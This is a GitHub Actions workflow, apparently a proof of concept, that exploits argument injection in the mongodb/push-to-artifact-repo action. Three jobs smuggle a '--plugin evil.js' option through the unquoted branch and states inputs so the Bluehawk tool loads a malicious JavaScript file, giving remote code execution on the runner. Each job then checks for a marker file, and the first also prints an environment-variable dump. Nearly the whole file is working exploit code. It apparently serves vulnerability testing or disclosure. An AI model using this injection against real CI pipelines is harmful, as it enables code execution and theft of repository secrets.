name: POC - Plugin Injection (CRITICAL - RCE)

on:
  workflow_dispatch:
  push:
    branches:
      - main

# CRITICAL VULNERABILITY:
# The --plugin option in Bluehawk does a dynamic import() of any JS file.
# By injecting --plugin via the unquoted $INPUT_BRANCH, we can load
# a malicious JS file and achieve Remote Code Execution!

jobs:
  # Attempt 1: Inject --plugin pointing to our evil.js in the source
  plugin-injection-source:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: "ðŸš¨ CRITICAL: Plugin injection via branch input"
        uses: mongodb/push-to-artifact-repo@main
        continue-on-error: true
        with:
          email: "test@example.com"
          name: "Tester"
          # Inject --plugin pointing to our malicious JS file
          # The file exists in ./source/evil.js (checked out repo)
          branch: "main --plugin ./source/evil.js"
          source: "./source"
          toRepo: "https://github.com/nonexistent/repo.git"

      - name: Verify plugin injection
        run: |
          echo "============================================"
          echo "Checking for plugin injection RCE..."
          echo "============================================"
          if [ -f /tmp/plugin-injection-pwned.txt ]; then
            echo "ðŸš¨ðŸš¨ðŸš¨ CRITICAL: REMOTE CODE EXECUTION ACHIEVED! ðŸš¨ðŸš¨ðŸš¨"
            echo ""
            cat /tmp/plugin-injection-pwned.txt
            echo ""
            echo "Environment variables were also dumped!"
            if [ -f /tmp/env-dump.txt ]; then
              echo "First 50 lines of env dump:"
              head -50 /tmp/env-dump.txt
            fi
          else
            echo "Plugin injection file not found"
            echo "The --plugin option may not have been parsed"
          fi

  # Attempt 2: Try with absolute workspace path
  plugin-injection-absolute:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: "ðŸš¨ CRITICAL: Plugin injection with absolute path"
        uses: mongodb/push-to-artifact-repo@main
        continue-on-error: true
        with:
          email: "test@example.com"
          name: "Tester"
          # Try with /github/workspace path (Docker mount point)
          branch: "main --plugin /github/workspace/source/evil.js"
          source: "./source"
          toRepo: "https://github.com/nonexistent/repo.git"

      - name: Verify plugin injection
        run: |
          if [ -f /tmp/plugin-injection-pwned.txt ]; then
            echo "ðŸš¨ðŸš¨ðŸš¨ CRITICAL: RCE VIA ABSOLUTE PATH! ðŸš¨ðŸš¨ðŸš¨"
            cat /tmp/plugin-injection-pwned.txt
          else
            echo "Absolute path injection did not work"
          fi

  # Attempt 3: Try injecting plugin before git command
  plugin-injection-states:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: "ðŸš¨ CRITICAL: Plugin injection via states input"
        uses: mongodb/push-to-artifact-repo@main
        continue-on-error: true
        with:
          email: "test@example.com"
          name: "Tester"
          # Try via states input which also has unquoted vars
          states: "main --plugin /github/workspace/source/evil.js"
          source: "./source"
          toRepo: "https://github.com/nonexistent/repo.git"

      - name: Verify
        run: |
          if [ -f /tmp/plugin-injection-pwned.txt ]; then
            echo "ðŸš¨ðŸš¨ðŸš¨ CRITICAL: RCE VIA STATES INPUT! ðŸš¨ðŸš¨ðŸš¨"
            cat /tmp/plugin-injection-pwned.txt
          else
            echo "States injection did not trigger plugin load"
          fi
